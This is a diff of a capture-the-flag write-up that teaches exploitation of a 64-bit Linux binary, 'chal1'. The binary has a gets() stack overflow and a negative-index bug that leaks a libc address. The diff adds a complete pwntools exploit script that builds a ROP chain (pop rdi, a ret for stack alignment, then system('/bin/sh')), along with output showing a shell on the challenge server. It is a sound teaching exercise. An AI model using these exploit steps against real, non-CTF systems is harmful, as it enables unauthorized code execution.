@@ -5,6 +5,7 @@
 * Ghidra
 * Python with pwntools
 * GDB with GEF
+* ROPgadget (should be installed with pwntools)
 
 ## Initial analysis
 
@@ -14,10 +15,27 @@ We are given binary files `chal1`, `libc.so.6,` and `ld-linux-x86-64.so.2`.
 * `libc.so.6` is the C standard library used by `chal1`.
 * `ld-linux-x86-64.so.2` is the dynamic linker for the specific version of the given libc binary.
 
-This is unnecessary, but for fun, we can run the libc binary with the ld-linux.so linker to see the libc version.
+This is unnecessary for this challenge, but for fun, we can use `strings` to see the libc version.
 
 ```
-./ld-linux-x86-64.so.2 ./libc.so.6
+$ strings libc.so.6 | grep -i "version"
+versionsort64
+gnu_get_libc_version
+argp_program_version
+versionsort
+__nptl_version
+argp_program_version_hook
+RPC: Incompatible versions of RPC
+RPC: Program/version mismatch
+<malloc version="1">
+Print program version
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35.
+Compiled by GNU CC version 11.4.0.
+(PROGRAM ERROR) No version known!?
+%s: %s; low version = %lu, high version = %lu
+.gnu.version
+.gnu.version_d
+.gnu.version_r
 ```
 
 Let's inspect the binary.
@@ -27,7 +45,7 @@ $ file chal1
 chal1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-linux-x86-64.so.2, BuildID[sha1]=82206e976c7e070c37c58300a612ef3b77864a43, for GNU/Linux 4.4.0, not stripped
 ```
 
-The binary is not stripped, meaning that symbol names (for functions and global variables) are intact, which makes reversing this binary easier.
+The command shows us that the environment for the executable is Linux x86-64, which is very typical of CTF pwn challenges. It is also not stripped, meaning that symbol names (for functions and global variables) are intact, which makes reversing this binary easier.
 
 We can use the `checksec` command from pwntools to see the security properties of the `chal1` binary.
 
@@ -45,7 +63,7 @@ $ pwn checksec chal1
 
 Let's also look at the decompilation of some of the functions using Ghidra.
 
-```
+```c
 void disable_buffers(void)
 {
   setbuf(stdin,(char *)0x0);
@@ -81,7 +99,9 @@ undefined8 main(void)
   puts("See you soon!");
   return 0x0;
 }
+```
 
+```
 ...
 
                              DAT_00102056                                    XREF[2]:     main:00101234(*), 
@@ -97,15 +117,17 @@ undefined8 main(void)
         00102083 25              ??         25h    %
         00102084 75              ??         75h    u
         00102085 00              ??         00h
+
+...
 ```
 
-We can ignore the `disable_buffers` function. Disabling the standard IO streams is very common in CTF pwn challenges. What is very interesting is the use of `gets` in `main`, which makes `main` vulnerable because `gets` writes to a buffer without checking the bound of the buffer. `local_98` is a stack buffer, so we can use `gets` to achieve a stack buffer overflow and overwrite the return address of `main`.
+We can ignore the `disable_buffers` function. Disabling the standard IO stream buffers makes IO with the process easier and is very common in CTF pwn challenges. What is very interesting is the use of `gets` in `main`, which makes `main` vulnerable because `gets` writes to a buffer without checking the bound of the buffer. `local_98` is a stack buffer, so we can use `gets` to achieve a stack buffer overflow, overwrite the return address of `main`, and hijack the execution of the program.
 
-An unbounded stack buffer overflow often allows ROP (return oriented programming), which is especially useful when the stack is non-executable. The stack is indeed non-executable in our case, since the `checksec` command indicated that NX is enabled. To use ROP to open a shell, which is our goal, we can call the `system` function in libc with the argument `/bin/sh`. Therefore, we want to know the address of `system` in the process virtual memory, so that we can write the address of `system` as a return address on the stack. However, the `system` address will be randomized because of ASLR.
+An unbounded stack buffer overflow often allows ROP (return oriented programming), which is especially useful when the stack is non-executable. The stack is indeed non-executable in our case, since the `checksec` command indicated that NX is enabled. To use ROP to open a shell, which is our goal, we can call the `system` function in libc with the argument `/bin/sh`. Therefore, we want to know the address of `system` in the process virtual memory, so that we can write the address of `system` as the return address on the stack. However, the `system` address will be randomized because of ASLR.
 
 ## Leaking a libc address
 
-To defeat ASLR and get the address of the `system` function in the process virtual memory, we can make the program output a memory address in libc (called a libc leak). With ASLR, objects in virtual memory (such as the program code or libc) are shifted by a random amount, so once we know a leaked address of some data in libc, the base address of libc will be a constant offset away from the leaked address. With the base libc address, we will be able to correctly compute the address of any other item in libc, such as `system`.
+To defeat ASLR and find the address of the `system` function in the process virtual memory, we can make the program output a memory address in libc (called a libc leak). With ASLR, segments in virtual memory (such as the program code or libc) are shifted by a random amount. Once we know a leaked address of some item in libc, we can compute the base address of libc, which will be a constant offset away from the leaked address. With the libc base address, we will be able to correctly compute the address of any other item in libc, such as `system`, by adding a constant offset to the libc base address.
 
 Indeed, it is possible to make the program output a libc leak. Let's run the program under GDB with `gdb chal1`, set a breakpoint on `main` with `b main`, run until the breakpoint with `r`, and disassemble the `main` function with `disas` (`disas` works here because the binary is not stripped).
 
@@ -183,7 +205,7 @@ Dump of assembler code for function main:
 > [!NOTE]
 > The addresses that you see in GDB when running `gdb <program>` are not randomized by default. You can enable randomization by running `set disable-randomization off` before `r`unning the program in GDB.
 
-At address 0x55555555520f (0x520f for short), we can see the address of the `name` buffer, which is 0x80a0. Since the binary is not stripped, the address of the `name` buffer can also be found with `i addr name`.
+At address 0x55555555520f (0x520f for short) with the LEA instruction, we can see the address of the `name` buffer, which is 0x80a0 (for short). Since the binary is not stripped, the address of the `name` buffer can also be found with `i addr name`.
 
 Let's also run `i file` to list the program sections to see if there's something interesting about the address of `name`.
 
@@ -301,7 +323,7 @@ The virtual memory mapping also gives us the base address of libc for this proce
 
 How can we make the program output the data at `name-0x20`? This program has a subtle bug that we can take advantage here. Let's take another look at the decompilation:
 
-```
+```c
 int local_c;
 
 ...
@@ -312,7 +334,9 @@ __isoc99_scanf(&DAT_00102056,&local_c);
 ...
 
 strncpy(local_58,name + local_c,(ulong)local_10);
+```
 
+```
 ...
 
                              DAT_00102056                                    XREF[2]:     main:00101234(*), 
@@ -327,9 +351,9 @@ The source buffer of the string copy is `name + local_c`, and the type of `local
 > [!NOTE]
 > Negative indexing is a subtle and clever trick that I have seen in a few CTF pwn challenges, which is why I decided to include it in this challenge.
 
-We write the first part of the exploit script to get the libc base address:
+We write the first part of the exploit script to get the libc base address.
 
-```
+```py
 # "What is your name?"
 print(conn.recvline())
 conn.sendline(b"asdf")
@@ -352,7 +376,16 @@ print(f"libc_base_addr {hex(libc_base_addr)}")
 
 ## Building the ROP chain
 
-Now that we know the libc base address, we are able to correctly compute the address of any item in libc, such as `system` or ROP gadgets to set up the `system` call. Our goal is to call `system("/bin/sh")`, so we need to find a location in memory that has the null-termianted string `/bin/sh`. Fortunately for us, libc actually has `/bin/sh` strings within it, and we do not need to write the string ourselves to memory (though this is possible). In GEF, we can use the `grep` command to search for bytes in memory.
+Now that we know the libc base address, we are able to correctly compute the address of any item in libc, such as `system` or ROP gadgets to set up the `system` call, by adding the correct constant offset.
+
+Our goal is to call `system("/bin/sh")`. To find the address of `system`, we can simply use `i addr system` to look up the address of the `system` symbol.
+
+```
+gef➤  i addr system
+Symbol "system" is at 0x7ffff7c50d70 in a file compiled without debugging.
+```
+
+We also need a location in memory that has the null-termianted string `/bin/sh`. Fortunately for us, libc actually has `/bin/sh` strings within it, and we do not need to write the string ourselves to memory (though this is possible with ROP). In GEF, we can use the `grep` command to search for bytes in memory.
 
 ```
 gef➤  grep "/bin/sh\\x00"
@@ -360,3 +393,250 @@ gef➤  grep "/bin/sh\\x00"
 [+] In '/home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6'(0x7ffff7dbd000-0x7ffff7e15000), permission=r--
   0x7ffff7dd8678 - 0x7ffff7dd867f  →   "/bin/sh" 
 ```
+
+We need to set the first argument of `system` to a pointer to the `/bin/sh` string. The System V x86-64 ABI is used on Linux, and it defines a calling convention, which is how functions in machine code communicate with each other. The calling convention requires that when calling a function, the first 6 integer arguments are put in the following registers in the following order: RDI, RSI, RDX, RCX, R8, R9. Therefore, to pass the `/bin/sh` string to `system`, we need to set RDI to a pointer to `/bin/sh` before entering `system`. To set the RDI register in our ROP chain, we can use a ROP gadget. Let's use the ROPgadget tool to find gadgets in libc, since we know the libc base address.
+
+```
+ROPgadget --binary libc.so.6 --ropchain --nojop | less
+```
+
+The command produces a massive amount of output because it lists all gadgets that it can find, but towards the end, it lists gadgets that are particularly useful for ROP chains.
+
+```
+...
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+        [+] Gadget found: 0x5652a mov qword ptr [rsi], rdx ; ret
+        [+] Gadget found: 0x2be51 pop rsi ; ret
+        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
+        [-] Can't find the 'xor rdx, rdx' gadget. Try with another 'mov [reg], reg'
+
+        [+] Gadget found: 0x141c51 mov qword ptr [rsi], rdi ; ret
+        [+] Gadget found: 0x2be51 pop rsi ; ret
+        [+] Gadget found: 0x2a3e5 pop rdi ; ret
+        [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'
+
+        [+] Gadget found: 0xb0fc1 mov qword ptr [rdx], rcx ; ret
+        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
+        [+] Gadget found: 0x3d1ee pop rcx ; ret
+        [-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'
+
+        [+] Gadget found: 0x3a410 mov qword ptr [rdx], rax ; ret
+        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
+        [+] Gadget found: 0x45eb0 pop rax ; ret
+        [+] Gadget found: 0xbaaf9 xor rax, rax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+        [+] Gadget found: 0xbaaf9 xor rax, rax ; ret
+        [+] Gadget found: 0xd8340 add rax, 1 ; ret
+        [+] Gadget found: 0xa991f add eax, 1 ; ret
+        [+] Gadget found: 0xf4755 add al, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+        [+] Gadget found: 0x2a3e5 pop rdi ; ret
+        [+] Gadget found: 0x2be51 pop rsi ; ret
+        [+] Gadget found: 0x108b03 pop rdx ; pop rcx ; pop rbx ; ret
+
+- Step 4 -- Syscall gadget
+
+        [+] Gadget found: 0x29db4 syscall
+
+- Step 5 -- Build the ROP chain
+
+...
+```
+
+The gadget that we are most interested in is the `pop rdi ; ret` gadget at offset 0x2a3e5. To set the RDI register to whatever we want, we can push the set RDI gadget to our ROP chain and then push the 8 bytes that we want to put in RDI. We will use this to set RDI to point to the `/bin/sh` string.
+
+It seems like we are all ready to make our exploit! (There's a small catch, but more on that later.) Our payload to `gets` needs to first have padding to fill the stack until the return address, and then have our ROP chain. We can look at the disassembly to quickly determine how many bytes of padding we need.
+
+```
+...
+
+        001012d7 48 8d 85        LEA        RAX=>local_98,[RBP + -0x90]
+                 70 ff ff ff
+        001012de 48 89 c7        MOV        RDI,RAX
+        001012e1 e8 9a fd        CALL       <EXTERNAL>::gets                                 char * gets(char * __s)
+                 ff ff
+
+...
+```
+
+In case you do not understand the assembly code, the LEA instruction computes RBP-0x90 and stores the result in RAX. The MOV instruction sets the value of RDI to RAX. And of course, the CALL instruction calls the `gets` function. Note that RDI is RBP-0x90, meaning that the first argument to `gets` is a pointer to the stack buffer at RBP-0x90.
+
+As a reminder, RBP is the base pointer, which is the high end of the current stack frame, away from the top of the stack. The stack location at RBP contains the saved RBP value for the previous stack frame, and the stack location at RBP+0x8 contains the return address for the current stack frame. Therefore, we need 0x98 bytes of padding to reach the return address, and then we can write our ROP chain.
+
+We write the next part of the exploit script.
+
+```py
+# "What's a fun fact about yourself?"
+print(conn.recvline())
+
+binsh_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7dd8678
+set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
+system_addr = libc_base_addr - 0x7ffff7c00000 + 0x7ffff7c50d70
+
+payload = b"h" * 0x90 + b"h" * 8
+payload += p64(set_rdi_gadget_addr)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+conn.sendline(payload)
+
+# "See you soon!"
+print(conn.recvline())
+
+conn.interactive()
+```
+
+Let's run it locally to test our exploit!
+
+```py
+gdbscript = "b main\nb *main+261\nc"
+
+with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
+    ...
+```
+
+Let's use the `ni` command after the breakpoint on `gets` to step through the RET instruction and see our ROP chain execute. Once we reach `system`, we can run `c` to continue. We should see a shell open! But wait, what's this? A segmentation fault?
+
+```
+(remote) gef➤  c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007778d3850973 in ?? () from ./libc.so.6
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00007778d39d8678  →  0x0068732f6e69622f ("/bin/sh"?)
+$rcx   : 0x00007778d3914887  →  0x5177fffff0003d48 ("H="?)
+$rdx   : 0x1               
+$rsp   : 0x00007fffa8496cb8  →  0x000000000000000d ("\r"?)
+$rbp   : 0x6868686868686868 ("hhhhhhhh"?)
+$rsi   : 0x1               
+$rdi   : 0x00007778d39d8678  →  0x0068732f6e69622f ("/bin/sh"?)
+$rip   : 0x00007778d3850973  →   movaps XMMWORD PTR [rsp], xmm1
+$r8    : 0xd               
+$r9    : 0x0               
+$r10   : 0x00007778d3809c78  →  0x000f0022000043b3
+$r11   : 0x246             
+$r12   : 0x00007fffa8497168  →  0x00007fffa8497654  →  0x00316c6168632f2e ("./chal1"?)
+$r13   : 0x00007778d3a1c7a0  →  0x0000000000000000
+$r14   : 0x00007778d3a1c840  →  0x0000000000000000
+$r15   : 0x00007778d3a79040  →  0x00007778d3a7a2e0  →  0x00005f3540f71000  →  0x00010102464c457f
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffa8496cb8│+0x0000: 0x000000000000000d ("\r"?)   ← $rsp
+0x00007fffa8496cc0│+0x0008: 0x00007778d3a371e0  →  0x00007778d3800000  →  0x03010102464c457f
+0x00007fffa8496cc8│+0x0010: 0x00007778d3a1a1b8  →  0x00007778d3a5a660  →  <_dl_audit_preinit+0000> endbr64 
+0x00007fffa8496cd0│+0x0018: 0x00005f35ffffffff
+0x00007fffa8496cd8│+0x0020: 0x00005f3540f74dc8  →  0x00005f3540f72140  →   endbr64 
+0x00007fffa8496ce0│+0x0028: 0x00007778d3a1b803  →  0xa1ca70000000000a ("\n"?)
+0x00007fffa8496ce8│+0x0030: 0x00007778d3a1b803  →  0xa1ca70000000000a ("\n"?)
+0x00007fffa8496cf0│+0x0038: 0x000000000000ff00
+─────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7778d3850950                  mov    QWORD PTR [rsp+0x180], 0x1
+   0x7778d385095c                  mov    DWORD PTR [rsp+0x208], 0x0
+   0x7778d3850967                  mov    QWORD PTR [rsp+0x188], 0x0
+ → 0x7778d3850973                  movaps XMMWORD PTR [rsp], xmm1
+   0x7778d3850977                  lock   cmpxchg DWORD PTR [rip+0x1cbe01], edx        # 0x7778d3a1c780
+   0x7778d385097f                  jne    0x7778d3850c30
+   0x7778d3850985                  mov    eax, DWORD PTR [rip+0x1cbdf9]        # 0x7778d3a1c784
+   0x7778d385098b                  lea    edx, [rax+0x1]
+   0x7778d385098e                  mov    DWORD PTR [rip+0x1cbdf0], edx        # 0x7778d3a1c784
+─────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "chal1", stopped 0x7778d3850973 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7778d3850973 → movaps XMMWORD PTR [rsp], xmm1
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+> [!NOTE]
+> The addresses you see in GDB when launched from pwntools using `gdb.debug` are randomized.
+
+The fact that the MOVAPS instruction has RSP as an operand hints at the problem. In the System V x86-64 ABI, before each function call, the stack must be 16-byte aligned; that is, RSP must be a multiple of 16. The CALL instruction pushes an 8-byte return address on the stack, so after a CALL instruction in the callee function, RSP is offset by 8 (RSP mod 16 = 8). If we step through each instruction in our ROP chain, we see that when we first reach `system`, RSP is a multiple of 16, which we can easily tell by seeing that the last hex digit is 0. This indicates incorrect stack alignment.
+
+To fix the stack alignment, one simple solution is to include a RET gadget in our ROP chain right before the call to `system`. The RET instruction pops an 8-byte return address from the stack, which increments RSP by 8. We can simply use `objdump` to disassemble libc and quickly find the offset of a RET instruction.
+
+```
+$ objdump -d -M intel libc.so.6 | grep "ret" | head -n 1
+   29cd6:       c3                      ret
+```
+
+Let's add the new gadget right before the `system` call to our ROP chain.
+
+```py
+...
+ret_gadget_addr = libc_base_addr + 0x29cd6
+
+payload = b"h" * 0x90 + b"h" * 8
+payload += p64(set_rdi_gadget_addr)
+payload += p64(binsh_addr)
+payload += p64(ret_gadget_addr)
+payload += p64(system_addr)
+conn.sendline(payload)
+
+...
+```
+
+Use `c` in GDB to continue past the breakpoint, and we have our shell!
+
+```
+[+] Starting local process '/usr/bin/gdbserver': pid 43476
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './chal1', '-x', '/tmp/pwnlib-gdbscript-gnsz_4yx.gdb']
+b'What is your name?\n'
+b'What starting index for a name substring do you want?\n'
+b'What substring length do you want?\n'
+b'Here is your substring:\n'
+libc_base_addr 0x781a2b600000
+b"What's a fun fact about yourself?\n"
+b'See you soon!\n'
+[*] Switching to interactive mode
+Detaching from process 43522
+$ pwd
+/home/carson/dev/utahsec-challenges/2024-11-14/chal1
+$ whoami
+carson
+$ 
+```
+
+## Getting the flag
+
+The exploit works locally, so we should be able to connect to the remote server and get our flag there.
+
+```py
+with remote("54.193.31.133", 13000) as conn:
+    ...
+```
+
+```
+[+] Opening connection to 54.193.31.133 on port 13000: Done
+b'What is your name?\n'
+b'What starting index for a name substring do you want?\n'
+b'What substring length do you want?\n'
+b'Here is your substring:\n'
+libc_base_addr 0x748a9c43c000
+b"What's a fun fact about yourself?\n"
+b'See you soon!\n'
+[*] Switching to interactive mode
+$ ls
+flag.txt
+ld-linux-x86-64.so.2
+libc.so.6
+run
+$ cat flag.txt
+utahsec{wow_that's_a_really_fun_fact!_0942d7f95eb191ca}
+```
+
+We have our hard-earned flag!
+
+## Conclusion
+
+I hope that this writeup has helped you understand how to write a ROP exploit for binaries vulnerable to stack buffer overflows. See if you can use the skills you have learned from `chal1` to solve `chal2`!
